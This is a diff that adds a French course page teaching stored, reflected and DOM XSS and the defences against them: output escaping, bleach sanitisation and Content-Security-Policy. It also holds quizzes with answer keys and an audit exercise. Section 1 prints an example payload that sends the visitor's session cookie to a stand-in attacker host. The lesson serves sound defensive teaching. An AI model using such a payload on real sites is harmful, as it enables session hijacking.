@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Leçon 3</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+<script>
+var DAY = {
+  num: 3,
+  title: "XSS : l'échappement et la Content Security Policy",
+  subtitle: "Faire exécuter le script de l'attaquant dans le navigateur de la victime.",
+  theory: `
+<h3>1. Le mécanisme</h3>
+<p>Rappel express des mots. Le <strong>navigateur</strong> (Chrome, Firefox…) est le programme qui affiche les pages web ; il sait aussi exécuter du <strong>JavaScript</strong>, un langage qui rend les pages vivantes (boutons, animations). Un <strong>cookie</strong> est un petit fichier que le site dépose dans ton navigateur pour te reconnaître ; le <strong>cookie de session</strong> est ton « bracelet d'entrée » qui prouve que tu es connecté. Le <strong>DOM</strong> est la représentation, en mémoire du navigateur, de la page affichée.</p>
+<p>Le <strong>XSS</strong> (Cross-Site Scripting) consiste à <strong>injecter du JavaScript</strong> dans une page pour qu'il s'exécute chez les <strong>autres</strong> visiteurs — et non chez l'attaquant. Image : coller un mot piégé sur le tableau d'affichage d'un immeuble ; ce n'est pas toi qui le lis, mais chaque voisin qui passe. Trois formes : <strong>stocké</strong> (le script est enregistré en base et rejoué à chaque visiteur — le plus grave), <strong>réfléchi</strong> (le script est renvoyé aussitôt dans la réponse, souvent via un lien piégé), <strong>DOM</strong> (l'injection se fait entièrement côté JavaScript, dans le navigateur).</p>
+<pre class="pseudo"># XSS stocke : un vendeur saisit ceci dans la description d'un jeu
+&lt;script&gt;fetch('//pirate/vol?c='+document.cookie)&lt;/script&gt;   # ce JS envoie le cookie du visiteur vers le serveur "pirate"
+# -> execute chez CHAQUE visiteur qui ouvre la fiche du jeu -> vol de cookies de session</pre>
+
+<h3>2. Ce que ça permet</h3>
+<pre class="pseudo">- voler les cookies de session (usurper l'identite)       # se faire passer pour la victime
+- agir a la place de la victime (louer, changer un mdp)   # le JS clique/soumet des formulaires a sa place
+- defigurer la page, hameconner, keylogger                # defacement, faux formulaire piege, capture des frappes
+Un XSS chez un admin = compromission totale.              # l'attaquant herite alors de tous les privileges</pre>
+<p>« Hameçonner » (phishing) = afficher un faux formulaire pour piéger la victime ; un « keylogger » enregistre les touches frappées au clavier ; « défigurer » (defacement) = altérer l'apparence de la page.</p>
+
+<h3>3. La parade n°1 : l'échappement de sortie</h3>
+<p>Un <strong>moteur de templates</strong> assemble la page HTML finale en insérant les données dans un modèle « à trous ». L'<strong>échappement</strong> (escaping) consiste à remplacer les caractères spéciaux du HTML par leurs <strong>entités</strong> inoffensives : le chevron <code>&lt;</code> devient <code>&amp;lt;</code>, le chevron <code>&gt;</code> devient <code>&amp;gt;</code>. Résultat : le navigateur <em>affiche</em> le texte au lieu de l'<em>exécuter</em>. C'est comme mettre un texte entre guillemets : « ceci est à montrer, pas un ordre à suivre ».</p>
+<pre class="pseudo">{{ jeu.description }}          {# Django ECHAPPE d'office : &lt;script&gt; devient &amp;lt;script&amp;gt; #}
+# le navigateur AFFICHE alors le texte, il ne l'EXECUTE pas
+# c'est automatique dans tous les moteurs de templates modernes
+
+# LE DANGER : le contournement volontaire
+{{ jeu.description|safe }}     {# le filtre |safe AFFICHE sans echapper -> XSS possible ! #}</pre>
+
+<h3>4. Si du HTML riche est vraiment nécessaire : sanitiser</h3>
+<p>Parfois un champ doit accepter un peu de mise en forme (gras, liens). <strong>Sanitiser</strong> (nettoyer) = passer la saisie dans un filtre qui GARDE une petite liste de balises autorisées et SUPPRIME tout le reste (dont les scripts). En Python, la bibliothèque <code>bleach</code> fait ce travail.</p>
+<pre class="pseudo">import bleach                                     # bibliotheque de nettoyage HTML
+html_sur = bleach.clean(saisie,                   # nettoie le texte saisi par l'utilisateur
+    tags=["b", "i", "p", "a", "ul", "li"],        # liste BLANCHE : seules ces balises sont gardees
+    attributes={"a": ["href"]})                   # sur un lien &lt;a&gt;, seul l'attribut href est autorise
+# resultat : le HTML permis reste, les scripts et le reste sont retires
+# JAMAIS |safe sur du contenu utilisateur BRUT (non nettoye)</pre>
+
+<h3>5. La parade n°2 : Content-Security-Policy</h3>
+<p>Un <strong>en-tête HTTP</strong> est une ligne d'information technique que le serveur ajoute à sa réponse. L'en-tête <strong>Content-Security-Policy</strong> (CSP) dit au navigateur : « n'exécute du JavaScript QUE s'il provient de telle source autorisée ». Ainsi, même si un script pirate se glisse dans la page, le navigateur refuse de le lancer — un second rempart, la défense en profondeur.</p>
+<pre class="pseudo">Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'
+# default-src 'self'  : par defaut, ne charger que les ressources du MEME site
+# script-src 'self'   : n'executer que les scripts venant du meme site
+# object-src 'none'   : interdire les vieux plugins (Flash, etc.)
+# meme si un script malveillant passe, le navigateur REFUSE de l'executer -> defense en profondeur</pre>
+<div class="warn">Chaque moteur a son piège de contournement : Django <code>|safe</code>, Thymeleaf <code>th:utext</code>, Razor <code>Html.Raw()</code>, Blade <code>{!! !!}</code>. Ils désactivent l'échappement — à n'utiliser QUE sur du contenu de confiance, jamais sur une saisie utilisateur.</div>
+<div class="tip">La règle d'or : <strong>échapper à la sortie</strong>, selon le contexte (HTML, attribut, JS, URL). Le même texte s'échappe différemment dans <code>&lt;div&gt;ici&lt;/div&gt;</code> et dans <code>&lt;a href="ici"&gt;</code>. Les moteurs gèrent le contexte HTML ; l'injection dans du JavaScript inline demande une vigilance particulière (autre raison d'éviter le JS en ligne — voir la CSP).</div>`,
+  exercises: [
+    { type: "qcm", q: "Le XSS injecte…", opts: ["Du SQL", "Du JavaScript exécuté chez les autres visiteurs", "Un cookie", "Une image"], a: 1, exp: "Cross-Site Scripting." },
+    { type: "qcm", q: "Le XSS stocké est le plus grave car…", opts: ["Il est rapide", "Le script est en base et frappe chaque visiteur", "Il est réfléchi", "Il est côté serveur"], a: 1, exp: "Permanent et large." },
+    { type: "qcm", q: "Un XSS permet notamment…", opts: ["D'accélérer la page", "De voler les cookies de session", "De compresser", "De chiffrer"], a: 1, exp: "Usurpation d'identité." },
+    { type: "qcm", q: "La parade n°1 :", opts: ["Cacher le champ", "L'échappement de sortie (automatique dans les templates)", "Un WAF seul", "HTTPS"], a: 1, exp: "<script> devient du texte." },
+    { type: "qcm", q: "{{ description }} en Django…", opts: ["Exécute le HTML", "Échappe : affiche le texte, ne l'exécute pas", "Plante", "Ignore la valeur"], a: 1, exp: "Protection par défaut." },
+    { type: "qcm", q: "{{ description|safe }} …", opts: ["Échappe plus fort", "Affiche NON échappé → XSS possible", "Chiffre", "Valide"], a: 1, exp: "Le contournement dangereux." },
+    { type: "qcm", q: "Pour du HTML riche saisi par l'utilisateur :", opts: ["|safe direct", "Sanitiser (bleach) : garder le permis, retirer les scripts", "Interdire tout HTML sans exception", "Chiffrer"], a: 1, exp: "Nettoyage contrôlé." },
+    { type: "qcm", q: "L'équivalent de |safe en Thymeleaf :", opts: ["th:text", "th:utext (non échappé)", "th:if", "th:each"], a: 1, exp: "Même piège." },
+    { type: "qcm", q: "En Razor (C#), le contournement :", opts: ["@valeur", "Html.Raw(valeur)", "@if", "@foreach"], a: 1, exp: "Désactive l'échappement." },
+    { type: "qcm", q: "En Blade (PHP), le non échappé :", opts: ["{{ }}", "{!! !!}", "@csrf", "@if"], a: 1, exp: "À réserver au contenu sûr." },
+    { type: "qcm", q: "La Content-Security-Policy…", opts: ["Remplace l'échappement", "Refuse d'exécuter les scripts de sources non autorisées (2e rempart)", "Chiffre la page", "Accélère"], a: 1, exp: "Défense en profondeur." },
+    { type: "vf", q: "La CSP dispense d'échapper la sortie.", a: false, exp: "Elle complète l'échappement, ne le remplace pas." },
+    { type: "qcm", q: "L'échappement dépend…", opts: ["Du jour", "Du contexte (HTML, attribut, JS, URL)", "De rien", "Du navigateur seul"], a: 1, exp: "Même texte, échappement différent." },
+    { type: "qcm", q: "Un XSS chez un administrateur…", opts: ["Est sans effet", "Peut mener à la compromission totale", "Est réfléchi", "Est bloqué par HTTPS"], a: 1, exp: "Cible à haut privilège." },
+    { type: "vf", q: "Le JavaScript en ligne (inline) complique la protection et est bloqué par une bonne CSP.", a: true, exp: "Une raison de l'éviter." }
+  ],
+  final: {
+    title: "Exercice final — Neutraliser le XSS stocké",
+    intro: `<p>La description des jeux est affichée avec |safe. On referme.</p>`,
+    questions: [
+      { type: "qcm", q: "{{ jeu.description|safe }} avec une saisie vendeur :", opts: ["Risque un XSS stocké", "Est sûr", "Plus joli", "Sans effet"], a: 0, exp: "Script exécuté chez les visiteurs." },
+      { type: "qcm", q: "Correction minimale :", opts: ["Retirer |safe → {{ jeu.description }}", "ajouter un try", "cacher la description", "HTTPS"], a: 0, exp: "Échappement rétabli." },
+      { type: "qcm", q: "Si le HTML riche est requis :", opts: ["bleach.clean avec liste de balises", "|safe quand même", "rien", "un WAF"], a: 0, exp: "Sanitisation." },
+      { type: "qcm", q: "Deuxième rempart :", opts: ["Content-Security-Policy: script-src 'self'", "un cookie", "un log", "un cache"], a: 0, exp: "Défense en profondeur." },
+      { type: "vf", q: "Échapper à la sortie est la règle d'or contre le XSS.", a: true, exp: "Selon le contexte." }
+    ],
+    solution: `<pre class="pseudo"># VULNERABLE
+{{ jeu.description|safe }}                              {# |safe = affiche sans echapper -> XSS stocke #}
+
+# CORRIGE 1 — laisser l'echappement faire son travail
+{{ jeu.description }}                                   {# echappement automatique -> texte affiche, pas execute #}
+
+# CORRIGE 2 — si HTML riche necessaire, sanitiser a l'enregistrement
+jeu.description = bleach.clean(saisie, tags=["b","i","p","a"],   # ne garder que ces balises
+                               attributes={"a": ["href"]})       # et seulement href sur les liens
+
+# CORRIGE 3 — CSP en en-tete (2e rempart)
+Content-Security-Policy: default-src 'self'; script-src 'self'   # n'executer que les scripts du meme site</pre>
+<p>Le script injecté est neutralisé. Demain : la requête forgée — le CSRF.</p>`
+  }
+};
+</script>
+<script src="engine.js"></script>
+<script>
+var ECRITURE = {
+  placeholder: "Écris ta défense anti-XSS…",
+  items: [
+  { id: "secu-l3", title: "Chasse aux contournements d'échappement", level: 3,
+    statement: "Écris l'audit anti-XSS de ton capstone : 1) la commande qui repère tous les contournements d'échappement de ta pile (|safe, th:utext, Html.Raw, {!! !!}, innerHTML côté JS), 2) pour un cas légitime (un champ description qui doit accepter du gras/liens), la solution par sanitisation, 3) l'en-tête CSP de départ et pourquoi on la déploie d'abord en report-only.",
+    hints: [
+      "grep sur le motif de contournement propre à ta pile + innerHTML/insertAdjacentHTML côté JS.",
+      "Sanitiser à l'ENREGISTREMENT (une fois) plutôt qu'à chaque affichage.",
+      "report-only : la CSP signale ce qu'elle bloquerait sans rien casser, le temps d'ajuster."
+    ],
+    solution: "# 1. REPÉRER les contournements (adapter à ta pile)\ngrep -rn \"|safe\" templates/           # Django\n# th:utext (Thymeleaf) | Html.Raw (Razor) | {!! (Blade)\ngrep -rn \"innerHTML\\|insertAdjacentHTML\\|outerHTML\" static/  # XSS DOM côté JS\n\n# 2. CAS LÉGITIME — description avec gras/liens autorisés\n# Sanitiser À L'ENREGISTREMENT (forms.py / au save), pas à l'affichage :\nimport bleach\nBALISES = [\"b\", \"i\", \"strong\", \"em\", \"p\", \"br\", \"a\", \"ul\", \"li\"]\ndef clean_description(self):\n    return bleach.clean(\n        self.cleaned_data[\"description\"],\n        tags=BALISES, attributes={\"a\": [\"href\", \"title\"]}, strip=True)\n# en base : HTML déjà nettoyé -> l'affichage {{ description|safe }} devient\n# acceptable CAR la donnée est de confiance (nettoyée en amont).\n\n# 3. CSP progressive\n# Étape A (observer) : Content-Security-Policy-Report-Only: default-src 'self';\n#   script-src 'self'; report-uri /csp-report/\n#   -> le navigateur SIGNALE les violations sans rien bloquer (on ajuste)\n# Étape B (appliquer) : Content-Security-Policy: default-src 'self'; script-src 'self'\n#   -> une fois les faux positifs traités, on applique pour de bon.",
+    note: "Deux idées clés : sanitiser à l'ENTRÉE (une fois, au save) plutôt qu'à chaque sortie rend le |safe d'affichage acceptable car la donnée stockée est déjà propre ; et déployer la CSP en report-only d'abord évite de casser le site pendant qu'on découvre quels scripts légitimes elle bloquerait. La CSP mal réglée d'un coup casse tout et se fait désactiver — le report-only est la voie qui la fait adopter." }
+  ]
+};
+</script>
+<script src="exo-ecriture.js"></script>
+<script src="fil-rouge-data.js"></script>
+<script src="fil-rouge.js"></script>
+</body>
+</html>
